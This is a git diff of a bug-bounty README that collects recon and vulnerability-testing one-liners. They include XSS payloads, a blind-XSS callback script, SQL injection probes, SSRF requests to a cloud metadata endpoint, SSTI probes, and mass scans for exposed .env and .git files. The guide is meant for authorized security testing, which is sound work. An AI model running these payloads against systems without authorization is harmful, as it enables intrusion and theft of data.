@@ -2,7 +2,7 @@
 
 # KingOfBugBountyTips
 
-<img src="https://media.giphy.com/media/26tn33aiTi1jkl6H6/giphy.gif" width="300" alt="Hacking Animation">
+<img src="https://user-images.githubusercontent.com/50994705/228697976-c9e7e8b8-f6dd-4c5a-a7be-8c7b2e8e4a8c.gif" width="600" alt="Bug Bounty Hunter">
 
 ### The Ultimate Bug Bounty Reconnaissance Arsenal
 
@@ -10,18 +10,13 @@
   <img src="https://img.shields.io/badge/Bug%20Bounty-Hunter-red?style=for-the-badge&logo=hackerone">
   <img src="https://img.shields.io/badge/Recon-Methodology-blue?style=for-the-badge&logo=target">
   <img src="https://img.shields.io/badge/Oneliners-Collection-green?style=for-the-badge&logo=gnubash">
+  <img src="https://img.shields.io/badge/DoD-VDP-yellow?style=for-the-badge&logo=shieldsdotio">
 </p>
-
-<img src="https://media.giphy.com/media/RDZo7znAdn2u7sAcWH/giphy.gif" width="400" alt="Cyber Security">
-
----
 
 [![Telegram](https://img.shields.io/badge/Telegram-Join%20Group-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/joinchat/DN_iQksIuhyPKJL1gw0ttA)
 [![Twitter](https://img.shields.io/badge/Twitter-@ofjaaah-1DA1F2?style=for-the-badge&logo=twitter&logoColor=white)](https://twitter.com/ofjaaah)
 [![YouTube](https://img.shields.io/badge/YouTube-Subscribe-FF0000?style=for-the-badge&logo=youtube&logoColor=white)](https://www.youtube.com/c/OFJAAAH)
 [![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/atjunior/)
-
----
 
 <img src="https://github-readme-stats.vercel.app/api?username=KingOfBugbounty&show_icons=true&theme=radical" alt="GitHub Stats">
 
@@ -29,510 +24,455 @@
 
 ---
 
-## Department of Defense Bug Bounty Program
+## Department of Defense - Bug Bounty Program
 
 <div align="center">
 <table>
 <tr>
-<td align="center"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e0/United_States_Department_of_Defense_Seal.svg/200px-United_States_Department_of_Defense_Seal.svg.png" width="80"><br><b>DoD</b></td>
-<td align="center"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/69/Emblem_of_the_United_States_Department_of_the_Army.svg/200px-Emblem_of_the_United_States_Department_of_the_Army.svg.png" width="80"><br><b>Army</b></td>
-<td align="center"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e8/Seal_of_the_United_States_Department_of_the_Navy.svg/200px-Seal_of_the_United_States_Department_of_the_Navy.svg.png" width="80"><br><b>Navy</b></td>
-<td align="center"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d9/Seal_of_the_U.S._Air_Force.svg/200px-Seal_of_the_U.S._Air_Force.svg.png" width="80"><br><b>Air Force</b></td>
-<td align="center"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9b/Seal_of_the_United_States_Marine_Corps.svg/200px-Seal_of_the_United_States_Marine_Corps.svg.png" width="80"><br><b>Marines</b></td>
+<td align="center"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e0/United_States_Department_of_Defense_Seal.svg/150px-United_States_Department_of_Defense_Seal.svg.png" width="70"><br><b>DoD</b></td>
+<td align="center"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/69/Emblem_of_the_United_States_Department_of_the_Army.svg/150px-Emblem_of_the_United_States_Department_of_the_Army.svg.png" width="70"><br><b>Army</b></td>
+<td align="center"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e8/Seal_of_the_United_States_Department_of_the_Navy.svg/150px-Seal_of_the_United_States_Department_of_the_Navy.svg.png" width="70"><br><b>Navy</b></td>
+<td align="center"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d9/Seal_of_the_U.S._Air_Force.svg/150px-Seal_of_the_U.S._Air_Force.svg.png" width="70"><br><b>Air Force</b></td>
+<td align="center"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9b/Seal_of_the_United_States_Marine_Corps.svg/150px-Seal_of_the_United_States_Marine_Corps.svg.png" width="70"><br><b>Marines</b></td>
+<td align="center"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/57/Seal_of_the_United_States_Space_Force.svg/150px-Seal_of_the_United_States_Space_Force.svg.png" width="70"><br><b>Space Force</b></td>
 </tr>
 </table>
-
-<img src="https://media.giphy.com/media/077i6AULCXc0FKTj9s/giphy.gif" width="500" alt="Pentagon Security">
-
 </div>
-
----
-
-## About The Project
-
-<img align="right" src="https://media.giphy.com/media/SWoSkN6DxTszqIKEqv/giphy.gif" width="300">
-
-Our main goal is to share tips from well-known bug hunters. Using recon methodology, we find subdomains, APIs, and tokens that are exploitable.
-
-**What you'll find here:**
-- Curated oneliners for reconnaissance
-- XSS, SQLi, SSRF, and more vulnerability detection
-- Automation scripts
-- DoD scope configurations
-- Tool recommendations
-
-<br clear="right"/>
 
 ---
 
 ## Table of Contents
 
-<img align="right" src="https://media.giphy.com/media/l0IykDEpFyQeqyAeY/giphy.gif" width="200">
-
-- [Quick Start](#-quick-start)
-- [Required Tools](#-required-tools)
-- [Subdomain Enumeration](#-subdomain-enumeration)
-- [JavaScript Discovery](#-javascript-discovery)
-- [XSS Detection](#-xss-detection)
-- [SQL Injection](#-sql-injection)
-- [SSRF Testing](#-ssrf-testing)
-- [Web Crawling](#-web-crawling)
-- [DoD Scope](#-dod-scope)
-- [Automation Scripts](#-automation-scripts)
-- [Bash Functions](#-bash-functions)
-- [New Oneliners 2024-2025](#-new-oneliners-2024-2025)
-- [Search Engines](#-search-engines-for-hackers)
-
-<br clear="right"/>
+- [About](#about)
+- [Required Tools](#required-tools)
+- [BBRF Scope DoD](#bbrf-scope-dod)
+- [Subdomain Enumeration](#subdomain-enumeration)
+- [JavaScript Recon](#javascript-recon)
+- [XSS Detection](#xss-detection)
+- [SQL Injection](#sql-injection)
+- [SSRF & SSTI](#ssrf--ssti)
+- [Web Crawling](#web-crawling)
+- [Parameter Discovery](#parameter-discovery)
+- [Content Discovery](#content-discovery)
+- [Nuclei Scanning](#nuclei-scanning)
+- [Automation Scripts](#automation-scripts)
+- [Bash Functions](#bash-functions)
+- [New Oneliners 2024-2025](#new-oneliners-2024-2025)
+- [Search Engines for Hackers](#search-engines-for-hackers)
 
 ---
 
-## Quick Start
+## About
 
-<div align="center">
-<img src="https://media.giphy.com/media/3oKIPnAiaMCws8nOsE/giphy.gif" width="300" alt="Quick Start">
-</div>
+Our main goal is to share tips from well-known bug hunters. Using recon methodology, we find subdomains, APIs, and tokens that are exploitable. We aim to influence the community with Oneliner tips for better understanding.
 
-```bash
-# Clone the repository
-git clone https://github.com/KingOfBugbounty/KingOfBugBountyTips.git
-
-# Basic recon automation
-chaos -d $1 -o chaos1 -silent
-assetfinder -subs-only $1 >> assetfinder1
-subfinder -d $1 -o subfinder1 -silent
-cat assetfinder1 subfinder1 chaos1 | anew hosts
-httpx -l hosts -silent -threads 100 | anew alive_hosts
-```
+**Download BugBuntu:** [![BugBuntu](https://img.shields.io/badge/Download-BugBuntu-orange?style=flat-square&logo=linux)](https://sourceforge.net/projects/bugbuntu/)
 
 ---
 
 ## Required Tools
 
-<div align="center">
-<img src="https://media.giphy.com/media/KzJkzjggfGN5Py6nkT/giphy.gif" width="300" alt="Tools">
-</div>
-
 <details>
-<summary><b>Click to expand full tool list</b></summary>
+<summary><b>Click to expand tool list</b></summary>
 
-### Core Reconnaissance Tools
-| Tool | Description | Link |
-|:----:|:-----------:|:----:|
-| <img src="https://avatars.githubusercontent.com/u/50994705?s=30" width="20"> Subfinder | Fast subdomain discovery | [GitHub](https://github.com/projectdiscovery/subfinder) |
-| <img src="https://avatars.githubusercontent.com/u/6716868?s=30" width="20"> Amass | In-depth DNS enumeration | [GitHub](https://github.com/OWASP/Amass) |
-| <img src="https://avatars.githubusercontent.com/u/50994705?s=30" width="20"> Httpx | Fast HTTP toolkit | [GitHub](https://github.com/projectdiscovery/httpx) |
-| <img src="https://avatars.githubusercontent.com/u/50994705?s=30" width="20"> Nuclei | Vulnerability scanner | [GitHub](https://github.com/projectdiscovery/nuclei) |
-| <img src="https://avatars.githubusercontent.com/u/50994705?s=30" width="20"> Katana | Web crawler | [GitHub](https://github.com/projectdiscovery/katana) |
-| <img src="https://avatars.githubusercontent.com/u/50994705?s=30" width="20"> Naabu | Port scanner | [GitHub](https://github.com/projectdiscovery/naabu) |
-
-### Discovery & Collection Tools
-| Tool | Description | Link |
-|:----:|:-----------:|:----:|
-| Gau | Fetch URLs from web archives | [GitHub](https://github.com/lc/gau) |
-| Waybackurls | Fetch from Wayback Machine | [GitHub](https://github.com/tomnomnom/waybackurls) |
-| Gospider | Web spider | [GitHub](https://github.com/jaeles-project/gospider) |
-| Hakrawler | Web crawler | [GitHub](https://github.com/hakluke/hakrawler) |
-| Paramspider | Parameter discovery | [GitHub](https://github.com/devanshbatham/ParamSpider) |
-
-### Exploitation Tools
-| Tool | Description | Link |
-|:----:|:-----------:|:----:|
-| Dalfox | XSS scanner | [GitHub](https://github.com/hahwul/dalfox) |
-| SQLMap | SQL injection | [GitHub](https://github.com/sqlmapproject/sqlmap) |
-| XSStrike | XSS detection | [GitHub](https://github.com/s0md3v/XSStrike) |
-| Kxss | XSS parameter finder | [GitHub](https://github.com/Emoe/kxss) |
-
-### Utility Tools
-| Tool | Description | Link |
-|:----:|:-----------:|:----:|
-| Anew | Append unique lines | [GitHub](https://github.com/tomnomnom/anew) |
-| Qsreplace | Query string replacer | [GitHub](https://github.com/tomnomnom/qsreplace) |
-| Unfurl | URL parser | [GitHub](https://github.com/tomnomnom/unfurl) |
-| Gf | Grep wrapper | [GitHub](https://github.com/tomnomnom/gf) |
-| Ffuf | Web fuzzer | [GitHub](https://github.com/ffuf/ffuf) |
+| Category | Tools |
+|:--------:|:------|
+| **Subdomain** | [Subfinder](https://github.com/projectdiscovery/subfinder), [Amass](https://github.com/OWASP/Amass), [Assetfinder](https://github.com/tomnomnom/assetfinder), [Findomain](https://github.com/Edu4rdSHL/findomain), [Chaos](https://github.com/projectdiscovery/chaos-client) |
+| **HTTP** | [Httpx](https://github.com/projectdiscovery/httpx), [Httprobe](https://github.com/tomnomnom/httprobe) |
+| **Crawling** | [Katana](https://github.com/projectdiscovery/katana), [Gospider](https://github.com/jaeles-project/gospider), [Hakrawler](https://github.com/hakluke/hakrawler), [Cariddi](https://github.com/edoardottt/cariddi) |
+| **URLs** | [Gau](https://github.com/lc/gau), [Waybackurls](https://github.com/tomnomnom/waybackurls), [Waymore](https://github.com/xnl-h4ck3r/waymore) |
+| **Scanning** | [Nuclei](https://github.com/projectdiscovery/nuclei), [Jaeles](https://github.com/jaeles-project/jaeles), [Naabu](https://github.com/projectdiscovery/naabu) |
+| **XSS** | [Dalfox](https://github.com/hahwul/dalfox), [XSStrike](https://github.com/s0md3v/XSStrike), [Kxss](https://github.com/Emoe/kxss), [Airixss](https://github.com/ferreiraklet/airixss) |
+| **SQLi** | [SQLMap](https://github.com/sqlmapproject/sqlmap), [Ghauri](https://github.com/r0oth3x49/ghauri) |
+| **Utilities** | [Anew](https://github.com/tomnomnom/anew), [Qsreplace](https://github.com/tomnomnom/qsreplace), [Unfurl](https://github.com/tomnomnom/unfurl), [Gf](https://github.com/tomnomnom/gf), [Uro](https://github.com/s0md3v/uro) |
+| **Fuzzing** | [Ffuf](https://github.com/ffuf/ffuf), [Feroxbuster](https://github.com/epi052/feroxbuster) |
+| **JS Analysis** | [Subjs](https://github.com/lc/subjs), [LinkFinder](https://github.com/GerbenJavado/LinkFinder), [SecretFinder](https://github.com/m4ll0k/SecretFinder), [Jsubfinder](https://github.com/ThreatUnkown/jsubfinder) |
 
 </details>
 
 ---
 
+## BBRF Scope DoD
+
+```bash
+bbrf inscope add '*.af.mil' '*.osd.mil' '*.marines.mil' '*.pentagon.mil' '*.disa.mil' '*.health.mil' '*.dau.mil' '*.dtra.mil' '*.ng.mil' '*.dds.mil' '*.uscg.mil' '*.army.mil' '*.dcma.mil' '*.dla.mil' '*.dtic.mil' '*.yellowribbon.mil' '*.socom.mil' '*.spaceforce.mil' '*.ussf.mil'
+```
+
+---
+
 ## Subdomain Enumeration
 
-<div align="center">
-<img src="https://media.giphy.com/media/xT9IgzoKnwFNmISR8I/giphy.gif" width="400" alt="Subdomain Hunting">
-</div>
-
-### Multi-source Subdomain Discovery
+### Multi-Source Discovery
 ```bash
-# Combine multiple sources for comprehensive enumeration
-subfinder -d target.com -silent -all | anew subs.txt
+subfinder -d target.com -all -silent | anew subs.txt
 amass enum -passive -d target.com | anew subs.txt
 assetfinder -subs-only target.com | anew subs.txt
 chaos -d target.com -silent | anew subs.txt
 cat subs.txt | httpx -silent -threads 200 | anew alive.txt
 ```
 
-### Certificate Transparency Enumeration
+### Certificate Transparency
 ```bash
-# Search via crt.sh API
 curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | httpx -silent
 ```
 
-### JLDC Anubis API
+### Shodan + Nuclei Pipeline
 ```bash
-# Fast subdomain discovery via Anubis
-curl -s "https://jldc.me/anubis/subdomains/target.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew
+shodan domain target.com | awk '{print $3}' | httpx -silent | nuclei -t /nuclei-templates/ -severity critical,high
 ```
 
-### ASN-based Discovery
+### ASN Discovery
 ```bash
-# Find domains via ASN using metabigor
 echo 'target_org' | metabigor net --org -v | awk '{print $3}' | sed 's/[[0-9]]\+\.//g' | xargs -I@ sh -c 'prips @ | hakrevdns | anew'
 ```
 
-### Hurricane Electric DNS Extraction
+### DNS Bruteforce with Shuffledns
 ```bash
-# Extract domains from IP using HE
-nslookup target.com | awk '/Address: / {print $2}' | hednsextractor -silent -only-domains | httpx -silent -title -tech-detect -status-code
+shuffledns -d target.com -w wordlist.txt -r resolvers.txt -silent | httpx -silent | anew
 ```
 
-### Shodan Domain Discovery
+### Recursive Subdomain Enum
 ```bash
-# Use Shodan for subdomain discovery
-shodan domain target.com | awk '{print $3}' | httpx -silent | nuclei -t /nuclei-templates/
+subfinder -d target.com -recursive -all -silent | dnsx -silent | httpx -silent | anew recursive_subs.txt
 ```
 
 ---
 
-## JavaScript Discovery
+## JavaScript Recon
 
-<div align="center">
-<img src="https://media.giphy.com/media/ln7z2eWriiQAllfVcn/giphy.gif" width="150" alt="JavaScript">
-</div>
-
-### Complete JS Recon Pipeline
+### Complete JS Pipeline
 ```bash
-# Comprehensive JS file discovery
-subfinder -d target.com -silent -all | httpx -silent | katana -d 5 -silent -em js,jsp,json | anew js_files.txt
+subfinder -d target.com -silent | httpx -silent | katana -d 5 -jc -silent | grep -iE '\.js$' | anew js.txt
 ```
 
 ### Extract Secrets from JS
 ```bash
-# Find subdomains and secrets with jsubfinder
-cat subdomains.txt | httpx --silent | jsubfinder search -s
+cat js.txt | httpx -silent -sr -srd js_files/ && nuclei -t exposures/ -target js.txt
 ```
 
-### Advanced JS Collection
+### LinkFinder on JS Files
 ```bash
-# Multi-source JS collection with analysis
-domain="target.com"
-gau $domain | grep -iE '\.js' | grep -iEv '(\.jsp|\.json)' >> gauJS.txt
-waybackurls $domain | grep -iE '\.js' | grep -iEv '(\.jsp|\.json)' >> wayJS.txt
-gospider -a -s "https://$domain" -d 2 | grep -Eo "(http|https)://[^/\"].*\.js+" >> gospiderJS.txt
-cat gauJS.txt wayJS.txt gospiderJS.txt | sort -u | httpx -silent | nuclei -t exposures/ -o js_vulns.txt
+cat js.txt | xargs -I@ -P10 bash -c 'python3 linkfinder.py -i @ -o cli 2>/dev/null' | anew endpoints.txt
 ```
 
-### Extract Paths from JS
+### SecretFinder Mass Scan
 ```bash
-# Extract internal paths from JavaScript files
-cat file.js | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))" | sort -u
+cat js.txt | xargs -I@ -P5 python3 SecretFinder.py -i @ -o cli | anew secrets.txt
+```
+
+### JS Variables Extraction
+```bash
+cat file.js | grep -oE "var\s+\w+\s*=\s*['\"][^'\"]+['\"]" | sort -u
+```
+
+### API Keys from JS
+```bash
+cat js.txt | nuclei -t http/exposures/tokens/ -silent | anew api_keys.txt
 ```
 
 ---
 
 ## XSS Detection
 
-<div align="center">
-<img src="https://media.giphy.com/media/YQitE4YNQNahy/giphy.gif" width="300" alt="XSS">
-</div>
-
 ### Dalfox Pipeline
 ```bash
-# XSS scan with Dalfox
-echo "target.com" | waybackurls | gf xss | uro | qsreplace '"><svg onload=confirm(1)>' | dalfox pipe --silence
+cat urls.txt | gf xss | uro | qsreplace '"><svg onload=confirm(1)>' | dalfox pipe --silence --skip-bav
 ```
 
-### Airixss Quick Scan
+### Blind XSS with Callback
 ```bash
-# Fast XSS detection with Airixss
-echo testphp.vulnweb.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
+cat urls.txt | gf xss | qsreplace '"><script src=https://xss.report/c/YOURID></script>' | httpx -silent
 ```
 
-### FREQ XSS Detection
+### Airixss Fast Scan
 ```bash
-# XSS testing with freq
-echo target.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not'
+echo target.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
 ```
 
-### Bhedak Mass XSS
+### Knoxss API
 ```bash
-# Multi-payload XSS testing
-cat urls.txt | bhedak "\"><svg/onload=alert(1)>*'/---+{{7*7}}"
+cat urls.txt | gf xss | uro | xargs -I@ curl -s "https://knoxss.me/api/v3" -d "target=@" -H "X-API-KEY: YOUR_KEY"
 ```
 
-### Knoxss API Integration
+### DOM XSS Detection
 ```bash
-# Scan using Knoxss API
-echo "target.com" | subfinder -silent | gau | grep "=" | uro | gf xss | awk '{ print "curl https://knoxss.me/api/v3 -d \"target="$1 "\" -H \"X-API-KEY: YOUR_API_KEY\""}' | sh
+cat js.txt | xargs -I@ bash -c 'curl -s @ | grep -E "(document\.(location|URL|cookie|domain|referrer)|innerHTML|outerHTML|eval\(|\.write\()" && echo "--- @ ---"'
 ```
 
-### Nuclei XSS Templates
+### Mass XSS with Nuclei DAST
 ```bash
-# Use Nuclei XSS templates
-cat urls.txt | httpx -silent | nuclei -t dast/vulnerabilities/xss/ -rl 50 -o xss_results.txt
+cat urls.txt | httpx -silent | nuclei -dast -t dast/vulnerabilities/xss/ -rl 50
 ```
 
-### DOM XSS with Wingman
+### Reflected Parameter Detection
 ```bash
-# Search for DOM XSS vulnerabilities
-xargs -a domains.txt -I@ sh -c 'wingman -u @ --crawl | notify'
+cat urls.txt | kxss 2>/dev/null | grep -v "Not Reflected" | anew reflected_params.txt
 ```
 
 ---
 
 ## SQL Injection
 
-<div align="center">
-<img src="https://media.giphy.com/media/MM0Jrc8BHKx3y/giphy.gif" width="300" alt="SQL Injection">
-</div>
-
 ### SQLMap Mass Scan
 ```bash
-# Mass SQL injection testing
-httpx -l domains.txt -silent -threads 1000 | xargs -I@ sh -c 'findomain -t @ -q | httpx -silent | anew | waybackurls | gf sqli >> sqli.txt'
-sqlmap -m sqli.txt --batch --random-agent --level 1
+cat urls.txt | gf sqli | uro | anew sqli.txt && sqlmap -m sqli.txt --batch --random-agent --level 2 --risk 2
 ```
 
-### Quick SQLi Detection
+### Error-Based Detection
 ```bash
-# Fast SQL error detection
-grep "=" urls.txt | qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100
-grep -q -rn "syntax\|mysql\|error" output 2>/dev/null && echo "[VULNERABLE]"
+cat urls.txt | gf sqli | qsreplace "'" | httpx -silent -ms "error|sql|syntax|mysql|postgresql|oracle" | anew sqli_errors.txt
 ```
 
-### GF + SQLMap Pipeline
+### Time-Based Blind
 ```bash
-# Targeted SQLi with gf patterns
-cat urls.txt | gf sqli | qsreplace "1' AND '1'='1" | httpx -silent -mc 200 | anew sqli_candidates.txt
+cat urls.txt | gf sqli | qsreplace "1' AND SLEEP(5)-- -" | httpx -silent -timeout 10 | anew time_based.txt
 ```
 
----
-
-## SSRF Testing
-
-<div align="center">
-<img src="https://media.giphy.com/media/xUPGcEghH3lbcFDDGg/giphy.gif" width="300" alt="SSRF">
-</div>
-
-### Basic SSRF Discovery
+### Ghauri Scan
 ```bash
-# SSRF testing with Burp Collaborator
-findomain -t target.com -q | httpx -silent -threads 1000 | gau | grep "=" | qsreplace http://YOUR.burpcollaborator.net
+cat sqli.txt | xargs -I@ ghauri -u @ --batch --level 3
 ```
 
-### Interactsh SSRF Testing
+### UNION Detection
 ```bash
-# SSRF with Interactsh
-cat urls.txt | gf ssrf | qsreplace "https://YOUR_INTERACTSH_URL" | httpx -silent -mc 200
+cat urls.txt | gf sqli | qsreplace "1 UNION SELECT NULL,NULL,NULL-- -" | httpx -silent -mc 200
 ```
 
 ---
 
-## SSTI Testing
+## SSRF & SSTI
 
-### SSTI Payload Injection
+### SSRF with Interactsh
 ```bash
-# Test for SSTI vulnerabilities
-cat subdomains.txt | httpx -silent -status-code | gau --threads 200 | qsreplace "{{7*7}}" > fuzzing.txt
-ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080 -mr "49"
+cat urls.txt | gf ssrf | qsreplace "https://YOURBURP.oastify.com" | httpx -silent
+```
+
+### SSRF Parameter Fuzzing
+```bash
+cat urls.txt | qsreplace "http://169.254.169.254/latest/meta-data/" | httpx -silent -match-string "ami-id"
+```
+
+### SSTI Detection
+```bash
+cat urls.txt | gf ssti | qsreplace "{{7*7}}" | httpx -silent -match-string "49" | anew ssti_vuln.txt
+```
+
+### SSTI Payload Test
+```bash
+cat urls.txt | qsreplace '${7*7}' | httpx -silent -mr "49" && cat urls.txt | qsreplace '<%= 7*7 %>' | httpx -silent -mr "49"
+```
+
+### Full SSRF Chain
+```bash
+cat params.txt | grep -iE "(url|uri|path|src|dest|redirect|redir|return|next|target|out|view|page|show|fetch|load)" | qsreplace "http://YOURSERVER" | httpx -silent
 ```
 
 ---
 
 ## Web Crawling
 
-<div align="center">
-<img src="https://media.giphy.com/media/JIX9t2j0ZTN9S/giphy.gif" width="300" alt="Crawling">
-</div>
-
-### Katana Deep Crawling
+### Katana Deep Crawl
 ```bash
-# Katana with depth and JS extraction
-subfinder -d target.com -silent -all | httpx -silent | katana -d 5 -silent | grep -iE '\.js' | grep -iEv '(\.jsp|\.json)'
+katana -u https://target.com -d 10 -jc -kf all -aff -silent | anew crawl.txt
 ```
 
-### Gospider Crawling
+### Gospider Full Crawl
 ```bash
-# Gospider with custom headers
-chaos -d target.com -silent | httpx -silent | xargs -P100 -I@ gospider -c 30 -t 15 -d 4 -a -H "x-forwarded-for: 127.0.0.1" -H "User-Agent: Mozilla/5.0" -s @
+gospider -s https://target.com -c 20 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico)" | anew
 ```
 
-### Hakrawler Spider
+### Hakrawler with Scope
 ```bash
-# Hakrawler with linkfinder
-assetfinder -subs-only target.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %'
+echo https://target.com | hakrawler -d 5 -subs -u | anew hakrawler.txt
 ```
 
-### Cariddi Intensive Crawling
+### ParamSpider Discovery
 ```bash
-# Intensive crawling with Cariddi
-echo target.com | subfinder -silent | httpx -silent | cariddi -intensive
+paramspider -d target.com --exclude woff,css,js,png,svg,jpg -o params.txt
+```
+
+### Waymore Historical URLs
+```bash
+waymore -i target.com -mode U -oU urls.txt
 ```
 
 ---
 
-## DoD Scope
+## Parameter Discovery
 
-<div align="center">
-
-### BBRF Scope Configuration for Department of Defense
-
-<table>
-<tr>
-<td><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e0/United_States_Department_of_Defense_Seal.svg/100px-United_States_Department_of_Defense_Seal.svg.png" width="60"></td>
-<td>
-
+### X8 Hidden Parameters
 ```bash
-bbrf inscope add \
-  '*.af.mil' \
-  '*.osd.mil' \
-  '*.marines.mil' \
-  '*.pentagon.mil' \
-  '*.disa.mil' \
-  '*.health.mil' \
-  '*.dau.mil' \
-  '*.dtra.mil' \
-  '*.ng.mil' \
-  '*.dds.mil' \
-  '*.uscg.mil' \
-  '*.army.mil' \
-  '*.dcma.mil' \
-  '*.dla.mil' \
-  '*.dtic.mil' \
-  '*.yellowribbon.mil' \
-  '*.socom.mil'
+cat urls.txt | httpx -silent | xargs -I@ x8 -u @ -w params.txt
 ```
 
-</td>
-</tr>
-</table>
+### Arjun Discovery
+```bash
+arjun -i urls.txt -oT arjun_params.txt --stable
+```
 
-<img src="https://media.giphy.com/media/3o6ZsYm4U6T0R0YHVI/giphy.gif" width="400" alt="DoD Security">
+### Custom Param Bruteforce
+```bash
+cat urls.txt | sed 's/$/\?FUZZ=test/' | ffuf -w params.txt:FUZZ -u FUZZ -mc 200,301,302 -ac
+```
 
-</div>
+---
+
+## Content Discovery
+
+### Ffuf Directory Bruteforce
+```bash
+ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302,403 -ac -c -t 100
+```
+
+### Git Exposure
+```bash
+cat urls.txt | httpx -silent -path /.git/config -mc 200 -ms "[core]" | anew git_exposed.txt
+```
+
+### Sensitive Files
+```bash
+cat urls.txt | httpx -silent -path /.env,/config.php,/wp-config.php.bak,/.htaccess,/server-status -mc 200 | anew sensitive.txt
+```
+
+### Backup Files
+```bash
+cat urls.txt | sed 's/$/.bak/' | httpx -silent -mc 200 && cat urls.txt | sed 's/$/.old/' | httpx -silent -mc 200
+```
+
+### API Documentation
+```bash
+cat urls.txt | httpx -silent -path /swagger.json,/openapi.json,/api-docs,/swagger-ui.html -mc 200 | anew api_docs.txt
+```
+
+---
+
+## Nuclei Scanning
+
+### Full Template Scan
+```bash
+nuclei -l alive.txt -t /nuclei-templates/ -severity critical,high,medium -c 50 -rl 150 -o nuclei_results.txt
+```
+
+### CVE Scanning
+```bash
+nuclei -l alive.txt -t cves/ -severity critical,high -c 30 -o cve_results.txt
+```
+
+### Subdomain Takeover
+```bash
+subfinder -d target.com -silent | httpx -silent | nuclei -t takeovers/ -c 50
+```
+
+### Exposed Panels
+```bash
+nuclei -l alive.txt -t exposed-panels/ -c 50 | anew panels.txt
+```
+
+### Misconfigurations
+```bash
+nuclei -l alive.txt -t misconfiguration/ -severity high,critical | anew misconfig.txt
+```
+
+### DAST Mode
+```bash
+nuclei -l urls.txt -dast -rl 10 -c 3 -o dast_results.txt
+```
 
 ---
 
 ## Automation Scripts
 
-<div align="center">
-<img src="https://media.giphy.com/media/PiQejEf31116URju4V/giphy.gif" width="300" alt="Automation">
-</div>
-
-### Full Recon Automation
+### Full Recon Pipeline
 ```bash
 #!/bin/bash
 domain=$1
+mkdir -p $domain && cd $domain
 
-# Subdomain enumeration
-chaos -d $domain -o chaos.txt -silent
-assetfinder -subs-only $domain >> assetfinder.txt
-subfinder -d $domain -o subfinder.txt -silent
+# Subdomains
+subfinder -d $domain -all -silent | anew subs.txt
+amass enum -passive -d $domain | anew subs.txt
+assetfinder -subs-only $domain | anew subs.txt
 
-# Merge and dedupe
-cat chaos.txt assetfinder.txt subfinder.txt | anew all_subs.txt
+# Alive check
+cat subs.txt | httpx -silent -threads 100 | anew alive.txt
 
-# Probe alive hosts
-httpx -l all_subs.txt -silent -threads 100 | anew alive.txt
+# URLs
+cat alive.txt | katana -d 5 -jc -silent | anew urls.txt
+cat alive.txt | waybackurls | anew urls.txt
+cat alive.txt | gau --threads 50 | anew urls.txt
 
-# Port scanning
-naabu -l alive.txt -p - -silent | anew ports.txt
+# Vulnerability patterns
+cat urls.txt | gf xss | anew xss.txt
+cat urls.txt | gf sqli | anew sqli.txt
+cat urls.txt | gf ssrf | anew ssrf.txt
+cat urls.txt | gf lfi | anew lfi.txt
 
-# Vulnerability scanning
-nuclei -l alive.txt -t /nuclei-templates/ -o vulns.txt
-
-# Cleanup
-rm -rf chaos.txt assetfinder.txt subfinder.txt
+# Nuclei scan
+nuclei -l alive.txt -t /nuclei-templates/ -severity critical,high -o vulns.txt
 ```
 
-### XSS Mass Automation
+### XSS Hunter Script
 ```bash
 #!/bin/bash
 target=$1
-
-# Collect URLs
-waybackurls $target | anew urls.txt
-gau $target | anew urls.txt
-
-# Filter for XSS candidates
-cat urls.txt | gf xss | uro | anew xss_urls.txt
-
-# Test with multiple tools
-cat xss_urls.txt | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | anew xss_found.txt
-cat xss_urls.txt | dalfox pipe --silence | anew xss_found.txt
-```
-
-### Axiom Distributed Scan
-```bash
-# Distributed scanning with Axiom
-findomain -t domain -q -u url
-axiom-scan url -m subfinder -o subs --threads 3
-axiom-scan subs -m httpx -o http
-axiom-scan http -m ffuf --threads 15 -o ffuf-output
-cat ffuf-output | tr "," " " | awk '{print $2}' | fff | grep 200 | sort -u
+echo $target | waybackurls | anew urls.txt
+echo $target | gau | anew urls.txt
+cat urls.txt | gf xss | uro | qsreplace '"><img src=x onerror=alert(1)>' | airixss -payload "alert(1)" | tee xss_found.txt
+cat urls.txt | gf xss | uro | dalfox pipe --silence | tee -a xss_found.txt
 ```
 
 ---
 
 ## Bash Functions
 
-<div align="center">
-<img src="https://media.giphy.com/media/f3iwJFOVOwuy7K6FFw/giphy.gif" width="300" alt="Bash">
-</div>
-
-Add these functions to your `.bashrc` or `.zshrc`:
+Add to your `.bashrc` or `.zshrc`:
 
 ```bash
-# Quick subdomain recon
+# Quick recon
 recon() {
